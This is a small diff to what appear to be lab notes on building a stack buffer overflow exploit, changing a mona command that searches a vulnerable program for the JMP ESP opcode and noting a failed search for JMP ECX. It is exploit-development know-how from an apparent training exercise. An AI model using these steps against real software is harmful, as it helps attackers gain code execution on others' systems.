@@ -27,7 +27,7 @@ Steps:
         Use 'msf-nasm_shell' to find hex code of "JMP ESP"
             `msf-nasm_shell`
             `JMP ESP`
-        Run `!mona find -s "\xff\xe4" -m "VulnApp1.exe"`, which returns
+        Run `!mona find -s "\xff\xe4" -m "VulnApp2.exe"`, which returns
             "1480113d"
         Could not find an instruction that would let us jump directly to ECX
     6. Find hex instruction for "JMP ECX"
